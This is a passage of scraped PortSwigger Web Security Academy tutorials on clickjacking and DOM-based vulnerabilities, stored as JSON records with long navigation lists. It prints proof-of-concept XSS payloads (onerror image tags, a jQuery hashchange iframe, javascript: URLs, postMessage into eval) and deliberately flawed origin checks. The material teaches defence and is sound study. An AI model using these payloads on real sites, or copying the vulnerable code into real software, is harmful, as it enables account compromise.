X-Frame-Options `sameorigin` directive. The following CSP whitelists frames to the same domain only:\n\n`Content-Security-Policy: frame-ancestors 'self';`\n\nAlternatively, framing can be restricted to named sites:\n\n`Content-Security-Policy: frame-ancestors normal-website.com;`\n\nTo be effective against clickjacking and XSS, CSPs need careful development, implementation and testing and should be used as part of a multi-layer defense strategy.\n", "category": "Clickjacking"}, {"title": "What are DOM Based Vulnerabilities?", "content": "In this section, we will describe what the DOM is, explain how insecure processing of DOM data can introduce vulnerabilities, and suggest how you can prevent DOM-based vulnerabilities on your websites.\n\n#### Labs\n\nIf you're already familiar with the basic concepts behind DOM-based vulnerabilities and just want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access all of the labs in this topic from the link below.\n\n*   [View all DOM-based vulnerability labs](https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities)\n\nWhat is the DOM?\n----------------\n\nThe Document Object Model (DOM) is a web browser's hierarchical representation of the elements on the page. Websites can use JavaScript to manipulate the nodes and objects of the DOM, as well as their properties. DOM manipulation in itself is not a problem. In fact, it is an integral part of how modern websites work. However, JavaScript that handles data insecurely can enable various attacks. DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value, known as a source, and passes it into a dangerous function, known as a sink.\n\nTaint-flow vulnerabilities\n--------------------------\n\nMany DOM-based vulnerabilities can be traced back to problems with the way client-side code manipulates attacker-controllable data.\n\n### What is taint flow?\n\nTo either exploit or mitigate these vulnerabilities, it is important to first familiarize yourself with the basics of taint flow between sources and sinks.\n\n#### Sources\n\nA source is a JavaScript property that accepts data that is potentially attacker-controlled. An example of a source is the `location.search` property because it reads input from the query string, which is relatively simple for an attacker to control. Ultimately, any property that can be controlled by the attacker is a potential source. This includes the referring URL (exposed by the `document.referrer` string), the user's cookies (exposed by the `document.cookie` string), and web messages.\n\n#### Sinks\n\nA sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. For example, the `eval()` function is a sink because it processes the argument that is passed to it as JavaScript. An example of an HTML sink is `document.body.innerHTML` because it potentially allows an attacker to inject malicious HTML and execute arbitrary JavaScript.\n\nFundamentally, DOM-based vulnerabilities arise when a website passes data from a source to a sink, which then handles the data in an unsafe way in the context of the client's session.\n\nThe most common source is the URL, which is typically accessed with the `location` object. An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL. Consider the following code:\n\n```\ngoto = location.hash.slice(1)\nif (goto.startsWith('https:')) {\n\u00a0\u00a0location = goto;\n}\n```\n\nThis is vulnerable to [DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection) because the `location.hash` source is handled in an unsafe way. If the URL contains a hash fragment that starts with `https:`, this code extracts the value of the `location.hash` property and sets it as the `location` property of the `window`. An attacker could exploit this vulnerability by constructing the following URL:\n\n`https://www.innocent-website.com/example#https://www.evil-user.net`\n\nWhen a victim visits this URL, the JavaScript sets the value of the `location` property to `https://www.evil-user.net`, which automatically redirects the victim to the malicious site. This behavior could easily be exploited to construct a phishing attack, for example.\n\n### Common sources\n\nThe following are typical sources that can be used to exploit a variety of taint-flow vulnerabilities:\n\n```\ndocument.URL\ndocument.documentURI\ndocument.URLUnencoded\ndocument.baseURI\nlocation\ndocument.cookie\ndocument.referrer\nwindow.name\nhistory.pushState\nhistory.replaceState\nlocalStorage\nsessionStorage\nIndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)\nDatabase\n```\n\nThe following kinds of data can also be used as sources to exploit taint-flow vulnerabilities:\n\n*   [Reflected data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data) LABS\n*   [Stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data) LABS\n*   [Web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source) LABS\n\n### Which sinks can lead to DOM-based vulnerabilities?\n\nThe following list provides a quick overview of common DOM-based vulnerabilities and an example of a sink that can lead to each one. For a more comprehensive list of relevant sinks, please refer to the vulnerability-specific pages by clicking the links below.\n\nDOM-based vulnerability\n\nExample sink\n\n[DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) LABS\n\n```\n\n                        document.write()\n                    \n```\n\n[Open redirection](https://portswigger.net/web-security/dom-based/open-redirection) LABS\n\n```\n\n                        window.location\n                    \n```\n\n[Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation) LABS\n\n```\n\n                        document.cookie\n                    \n```\n\n[JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)\n\n```\n\n                        eval()\n                    \n```\n\n[Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)\n\n```\n\n                        document.domain\n                    \n```\n\n[WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)\n\n```\n\n                        WebSocket()\n                    \n```\n\n[Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)\n\n```\n\n                        element.src\n                    \n```\n\n[Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)\n\n```\n\n                        postMessage()\n                    \n```\n\n[Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)\n\n```\n\n                        setRequestHeader()\n                    \n```\n\n[Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)\n\n```\n\n                        FileReader.readAsText()\n                    \n```\n\n[Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)\n\n```\n\n                        ExecuteSql()\n                    \n```\n\n[HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)\n\n```\n\n                        sessionStorage.setItem()\n                    \n```\n\n[Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)\n\n```\n\n                        document.evaluate()\n                    \n```\n\n[Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)\n\n```\n\n                        JSON.parse()\n                    \n```\n\n[DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)\n\n```\n\n                        element.setAttribute()\n                    \n```\n\n[Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)\n\n```\n\n                        RegExp()\n                    \n```\n\n### How to prevent DOM-based taint-flow vulnerabilities\n\nThere is no single action you can take to eliminate the threat of DOM-based attacks entirely. However, generally speaking, the most effective way to avoid DOM-based vulnerabilities is to avoid allowing data from any untrusted source to dynamically alter the value that is transmitted to any sink.\n\nIf the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code. In many cases, the relevant data can be validated on a whitelist basis, only allowing content that is known to be safe. In other cases, it will be necessary to sanitize or encode the data. This can be a complex task, and depending on the context into which the data is to be inserted, may involve a combination of JavaScript escaping, HTML encoding, and URL encoding, in the appropriate sequence.\n\nFor measures you can take to prevent specific vulnerabilities, please refer to the corresponding vulnerability pages linked from the table above.\n\nDOM clobbering\n--------------\n\nDOM clobbering is an advanced technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the website. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.\n", "category": "DOM Based Vulnerabilities"}, {"title": "Reflected\n                                and stored data", "content": "### Testing HTML sinks\n\nTo test for DOM XSS in an HTML sink, place a random alphanumeric string into the source (such as `location.search`), then use developer tools to inspect the HTML and find where your string appears. Note that the browser's \"View source\" option won't work for DOM XSS testing because it doesn't take account of changes that have been performed in the HTML by JavaScript. In Chrome's developer tools, you can use `Control+F` (or `Command+F` on MacOS) to search the DOM for your string.\n\nFor each location where your string appears within the DOM, you need to identify the context. Based on this context, you need to refine your input to see how it is processed. For example, if your string appears within a double-quoted attribute then try to inject double quotes in your string to see if you can break out of the attribute.\n\nNote that browsers behave differently with regards to URL-encoding, Chrome, Firefox, and Safari will URL-encode `location.search` and `location.hash`, while IE11 and Microsoft Edge (pre-Chromium) will not URL-encode these sources. If your data gets URL-encoded before being processed, then an XSS attack is unlikely to work.\n\n### Testing JavaScript execution sinks\n\nTesting JavaScript execution sinks for DOM-based XSS is a little harder. With these sinks, your input doesn't necessarily appear anywhere within the DOM, so you can't search for it. Instead you'll need to use the JavaScript debugger to determine whether and how your input is sent to a sink.\n\nFor each potential source, such as `location`, you first need to find cases within the page's JavaScript code where the source is being referenced. In Chrome's developer tools, you can use `Control+Shift+F` (or `Command+Alt+F` on MacOS) to search all the page's JavaScript code for the source.\n\nOnce you've found where the source is being read, you can use the JavaScript debugger to add a break point and follow how the source's value is used. You might find that the source gets assigned to other variables. If this is the case, you'll need to use the search function again to track these variables and see if they're passed to a sink. When you find a sink that is being assigned data that originated from the source, you can use the debugger to inspect the value by hovering over the variable to show its value before it is sent to the sink. Then, as with HTML sinks, you need to refine your input to see if you can deliver a successful XSS attack.\n\n### Testing for DOM XSS using DOM Invader\n\nIdentifying and exploiting DOM XSS in the wild can be a tedious process, often requiring you to manually trawl through complex, minified JavaScript. If you use Burp's browser, however, you can take advantage of its built-in DOM Invader extension, which does a lot of the hard work for you.\n\nExploiting DOM XSS with different sources and sinks\n---------------------------------------------------\n\nIn principle, a website is vulnerable to DOM-based cross-site scripting if there is an executable path via which data can propagate from source to sink. In practice, different sources and sinks have differing properties and behavior that can affect exploitability, and determine what techniques are necessary. Additionally, the website's scripts might perform validation or other processing of data that must be accommodated when attempting to exploit a vulnerability. There are a variety of sinks that are relevant to DOM-based vulnerabilities. Please refer to the [list](https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities) below for details.\n\nThe `document.write` sink works with `script` elements, so you can use a simple payload, such as the one below:\n\n`document.write('... <script>alert(document.domain)</script> ...');`\n\nNote, however, that in some situations the content that is written to `document.write` includes some surrounding context that you need to take account of in your exploit. For example, you might need to close some existing elements before using your JavaScript payload.\n\nThe `innerHTML` sink doesn't accept `script` elements on any modern browser, nor will `svg onload` events fire. This means you will need to use alternative elements like `img` or `iframe`. Event handlers such as `onload` and `onerror` can be used in conjunction with these elements. For example:\n\n`element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'`\n\n### Sources and sinks in third-party dependencies\n\nModern web applications are typically built using a number of third-party libraries and frameworks, which often provide additional functions and capabilities for developers. It's important to remember that some of these are also potential sources and sinks for DOM XSS.\n\n#### DOM XSS in jQuery\n\nIf a JavaScript library such as jQuery is being used, look out for sinks that can alter DOM elements on the page. For instance, jQuery's `attr()` function can change the attributes of DOM elements. If data is read from a user-controlled source like the URL, then passed to the `attr()` function, then it may be possible to manipulate the value sent to cause XSS. For example, here we have some JavaScript that changes an anchor element's `href` attribute using data from the URL:\n\n```\n$(function() {\n\t$('#backLink').attr(\"href\",(new URLSearchParams(window.location.search)).get('returnUrl'));\n});\n```\n\nYou can exploit this by modifying the URL so that the `location.search` source contains a malicious JavaScript URL. After the page's JavaScript applies this malicious URL to the back link's `href`, clicking on the back link will execute it:\n\n`?returnUrl=javascript:alert(document.domain)`\n\nAnother potential sink to look out for is jQuery's `$()` selector function, which can be used to inject malicious objects into the DOM.\n\njQuery used to be extremely popular, and a classic DOM XSS vulnerability was caused by websites using this selector in conjunction with the `location.hash` source for animations or auto-scrolling to a particular element on the page. This behavior was often implemented using a vulnerable `hashchange` event handler, similar to the following:\n\n```\n$(window).on('hashchange', function() {\n\tvar element = $(location.hash);\n\telement[0].scrollIntoView();\n});\n```\n\nAs the `hash` is user controllable, an attacker could use this to inject an XSS vector into the `$()` selector sink. More recent versions of jQuery have patched this particular vulnerability by preventing you from injecting HTML into a selector when the input begins with a hash character (`#`). However, you may still find vulnerable code in the wild.\n\nTo actually exploit this classic vulnerability, you'll need to find a way to trigger a `hashchange` event without user interaction. One of the simplest ways of doing this is to deliver your exploit via an `iframe`:\n\n`<iframe src=\"https://vulnerable-website.com#\" onload=\"this.src+='<img src=1 onerror=alert(1)>'\">`\n\nIn this example, the `src` attribute points to the vulnerable page with an empty hash value. When the `iframe` is loaded, an XSS vector is appended to the hash, causing the `hashchange` event to fire.\n\n#### Note\n\nEven newer versions of jQuery can still be vulnerable via the `$()` selector sink, provided you have full control over its input from a source that doesn't require a `#` prefix.\n\n#### DOM XSS in AngularJS\n\nIf a framework like [AngularJS](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection) is used, it may be possible to execute JavaScript without angle brackets or events. When a site uses the `ng-app` attribute on an HTML element, it will be processed by AngularJS. In this case, AngularJS will execute JavaScript inside double curly braces that can occur directly in HTML or inside attributes.\n\nDOM XSS combined with reflected and stored data\n-----------------------------------------------\n\nSome pure DOM-based vulnerabilities are self-contained within a single page. If a script reads some data from the URL and writes it to a dangerous sink, then the vulnerability is entirely client-side.\n\nHowever, sources aren't limited to data that is directly exposed by browsers - they can also originate from the website. For example, websites often reflect URL parameters in the HTML response from the server. This is commonly associated with normal XSS, but it can also lead to reflected DOM XSS vulnerabilities.\n\nIn a reflected DOM XSS vulnerability, the server processes data from the request, and echoes the data into the response. The reflected data might be placed into a JavaScript string literal, or a data item within the DOM, such as a form field. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.\n\n`eval('var data = \"reflected string\"');`\n\nWebsites may also store data on the server and reflect it elsewhere. In a stored DOM XSS vulnerability, the server receives data from one request, stores it, and then includes the data in a later response. A script within the later response contains a sink which then processes the data in an unsafe way.\n\n`element.innerHTML = comment.author`\n\nWhich sinks can lead to DOM-XSS vulnerabilities?\n------------------------------------------------\n\nThe following are some of the main sinks that can lead to DOM-XSS vulnerabilities:\n\n```\ndocument.write()\ndocument.writeln()\ndocument.domain\nelement.innerHTML\nelement.outerHTML\nelement.insertAdjacentHTML\nelement.onevent\n```\n\nThe following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:\n\n```\nadd()\nafter()\nappend()\nanimate()\ninsertAfter()\ninsertBefore()\nbefore()\nhtml()\nprepend()\nreplaceAll()\nreplaceWith()\nwrap()\nwrapInner()\nwrapAll()\nhas()\nconstructor()\ninit()\nindex()\njQuery.parseHTML()\n$.parseHTML()\n```\n\nHow to prevent DOM-XSS vulnerabilities\n--------------------------------------\n\nIn addition to the general measures described on the [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) page, you should avoid allowing data from any untrusted source to be dynamically written to the HTML document.\n", "category": "DOM Based Vulnerabilities"}, {"title": "Web messages", "content": "### DOM-based vulnerabilities\n\n*   [What is the DOM?](https://portswigger.net/web-security/dom-based#what-is-the-dom)\n*    [Taint flow](https://portswigger.net/web-security/dom-based#what-is-taint-flow)\n    *    [Sources](https://portswigger.net/web-security/dom-based#common-sources)\n        *   [Reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Example sinks](https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities)\n*   [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n*    [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/open-redirection#what-is-the-impact-of-dom-based-open-redirection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/open-redirection#which-sinks-can-lead-to-dom-based-open-redirection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/open-redirection#how-to-prevent-dom-based-open-redirection-vulnerabilities)\n*    [Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/cookie-manipulation#what-is-the-impact-of-a-dom-based-cookie-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/cookie-manipulation#which-sinks-can-lead-to-dom-based-cookie-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/cookie-manipulation#how-to-prevent-dom-based-cookie-manipulation-vulnerabilities)\n*    [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/javascript-injection#what-is-the-impact-of-a-dom-based-javascript-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/javascript-injection#which-sinks-can-lead-to-dom-based-javascript-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/javascript-injection#how-to-prevent-dom-based-javascript-injection-vulnerabilities)\n*    [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/document-domain-manipulation#which-sinks-can-lead-to-dom-based-document-domain-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/document-domain-manipulation#how-to-prevent-dom-based-document-domain-manipulation-vulnerabilities)\n*    [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)\n    *   [Impact](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#what-is-the-impact-of-websocket-url-poisoning)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#which-sinks-can-lead-to-websocket-url-poisoning-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#how-to-prevent-dom-based-websocket-url-poisoning-vulnerabilities)\n*    [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/link-manipulation#what-is-the-impact-of-a-dom-based-link-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/link-manipulation#which-sinks-can-lead-to-dom-based-link-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/link-manipulation#how-to-prevent-dom-based-link-manipulation-vulnerabilities)\n*    [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/web-message-manipulation#which-sinks-can-lead-to-dom-based-web-message-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/web-message-manipulation#how-to-prevent-dom-based-web-message-manipulation)\n*    [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#what-is-the-impact-of-dom-based-ajax-request-header-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#which-sinks-can-lead-to-dom-based-ajax-request-header-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#how-to-prevent-dom-based-ajax-request-header-manipulation)\n*    [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#what-is-the-impact-of-dom-based-local-file-path-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#which-sinks-can-lead-to-dom-based-local-file-path-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#how-to-prevent-dom-based-local-file-path-manipulation-vulnerabilities)\n*    [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-sql-injection#what-is-the-impact-of-dom-based-client-side-sql-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-sql-injection#which-sinks-can-lead-to-dom-based-client-side-sql-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-sql-injection#how-to-prevent-dom-based-client-side-sql-injection-vulnerabilities)\n*    [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#which-sinks-can-lead-to-dom-based-html5-storage-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#how-to-prevent-dom-based-html5-storage-manipulation-vulnerabilities)\n*    [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#what-is-the-impact-of-dom-based-xpath-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#which-sinks-can-lead-to-xpath-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#how-to-prevent-dom-based-xpath-injection-vulnerabilities)\n*    [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-json-injection#what-is-the-impact-of-a-dom-based-json-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-json-injection#which-sinks-can-lead-to-dom-based-json-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-json-injection#how-to-prevent-client-side-json-injection-vulnerabilities)\n*    [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/dom-data-manipulation#what-is-the-impact-of-dom-data-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/dom-data-manipulation#which-sinks-can-lead-to-dom-data-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-data-manipulation#how-to-prevent-dom-data-manipulation-vulnerabilities)\n*    [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/denial-of-service#which-sinks-can-lead-to-dom-based-denial-of-service-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/denial-of-service#how-to-prevent-dom-based-denial-of-service-vulnerabilities)\n*    [Web message vulnerabilities](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Impact](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#what-is-the-impact-of-dom-based-web-message-vulnerabilities)\n    *   [Constructing an attack](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#how-to-construct-an-attack-using-web-messages-as-the-source)\n    *   [Origin verification](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#origin-verification)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#which-sinks-can-lead-to-dom-based-web-message-vulnerabilities)\n*    [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)\n    *   [Exploiting](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-exploit-dom-clobbering-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-prevent-dom-clobbering-attacks)\n*   [Preventing vulnerabilities](https://portswigger.net/web-security/dom-based#how-to-prevent-dom-based-taint-flow-vulnerabilities)\n*   [View all DOM-based vulnerability labs](https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [DOM-based](https://portswigger.net/web-security/dom-based)\n*   [Controlling the web message source](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n\nControlling the web message source\n==================================\n\nIn this section, we'll look at how web messages can be used as a source to exploit [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) on the recipient page. We'll also describe how such an attack is constructed, including how common origin-verification techniques can often be bypassed.\n\nIf a page handles incoming web messages in an unsafe way, for example, by not verifying the origin of incoming messages correctly in the event listener, properties and functions that are called by the event listener can potentially become sinks. For example, an attacker could host a malicious `iframe` and use the `postMessage()` method to pass web message data to the vulnerable event listener, which then sends the payload to a sink on the parent page. This behavior means that you can use web messages as the source for propagating malicious data to any of those sinks.\n\nWhat is the impact of DOM-based web message vulnerabilities?\n------------------------------------------------------------\n\nThe potential impact of the vulnerability depends on the destination document's handling of the incoming message. If the destination document trusts the sender not to transmit malicious data in the message, and handles the data in an unsafe way by passing it into a sink, then the joint behavior of the two documents may allow an attacker to compromise the user, for example.\n\nHow to construct an attack using web messages as the source\n-----------------------------------------------------------\n\nConsider the following code:\n\n```\n<script>\nwindow.addEventListener('message', function(e) {\n\u00a0\u00a0eval(e.data);\n});\n</script>\n```This is vulnerable because an attacker could inject a JavaScript payload by constructing the following `iframe`:\n\n`<iframe src=\"//vulnerable-website\" onload=\"this.contentWindow.postMessage('print()','*')\">`As the event listener does not verify the origin of the message, and the `postMessage()` method specifies the `targetOrigin` `\"*\"`, the event listener accepts the payload and passes it into a sink, in this case, the `eval()` function.\n\nLAB\n\nPRACTITIONER [DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)\n\nLAB\n\nPRACTITIONER [DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)\n\nOrigin verification\n-------------------\n\nEven if an event listener does include some form of origin verification, this verification step can sometimes be fundamentally flawed. For example, consider the following code:\n\n```\nwindow.addEventListener('message', function(e) {\n    if (e.origin.indexOf('normal-website.com') > -1) {\n        eval(e.data);\n    }\n});\n```The `indexOf` method is used to try and verify that the origin of the incoming message is the `normal-website.com` domain. However, in practice, it only checks whether the string `\"normal-website.com\"` is contained anywhere in the origin URL. As a result, an attacker could easily bypass this verification step if the origin of their malicious message was `http://www.normal-website.com.evil.net`, for example.\n\nThe same flaw also applies to verification checks that rely on the `startsWith()` or `endsWith()` methods. For example, the following event listener would regard the origin `http://www.malicious-websitenormal-website.com` as safe:\n\n```\nwindow.addEventListener('message', function(e) {\n    if (e.origin.endsWith('normal-website.com')) {\n        eval(e.data);\n    }\n});\n```\n\nLAB\n\nPRACTITIONER [DOM XSS using web messages and `JSON.parse`](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)\n\nWhich sinks can lead to DOM-based web message vulnerabilities?\n--------------------------------------------------------------\n\nAs long as a website accepts web message data from an untrusted source due to a lack of adequate origin verification, any sinks that are used by the incoming message event listener could potentially lead to vulnerabilities.\n\n", "category": "DOM Based Vulnerabilities"}, {"title": "Open redirection", "content": "### DOM-based vulnerabilities\n\n*   [What is the DOM?](https://portswigger.net/web-security/dom-based#what-is-the-dom)\n*    [Taint flow](https://portswigger.net/web-security/dom-based#what-is-taint-flow)\n    *    [Sources](https://portswigger.net/web-security/dom-based#common-sources)\n        *   [Reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Example sinks](https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities)\n*   [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n*    [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/open-redirection#what-is-the-impact-of-dom-based-open-redirection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/open-redirection#which-sinks-can-lead-to-dom-based-open-redirection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/open-redirection#how-to-prevent-dom-based-open-redirection-vulnerabilities)\n*    [Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/cookie-manipulation#what-is-the-impact-of-a-dom-based-cookie-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/cookie-manipulation#which-sinks-can-lead-to-dom-based-cookie-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/cookie-manipulation#how-to-prevent-dom-based-cookie-manipulation-vulnerabilities)\n*    [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/javascript-injection#what-is-the-impact-of-a-dom-based-javascript-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/javascript-injection#which-sinks-can-lead-to-dom-based-javascript-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/javascript-injection#how-to-prevent-dom-based-javascript-injection-vulnerabilities)\n*    [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/document-domain-manipulation#which-sinks-can-lead-to-dom-based-document-domain-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/document-domain-manipulation#how-to-prevent-dom-based-document-domain-manipulation-vulnerabilities)\n*    [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)\n    *   [Impact](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#what-is-the-impact-of-websocket-url-poisoning)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#which-sinks-can-lead-to-websocket-url-poisoning-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#how-to-prevent-dom-based-websocket-url-poisoning-vulnerabilities)\n*    [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/link-manipulation#what-is-the-impact-of-a-dom-based-link-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/link-manipulation#which-sinks-can-lead-to-dom-based-link-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/link-manipulation#how-to-prevent-dom-based-link-manipulation-vulnerabilities)\n*    [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/web-message-manipulation#which-sinks-can-lead-to-dom-based-web-message-manipulation-vulnerabilities)\n    *   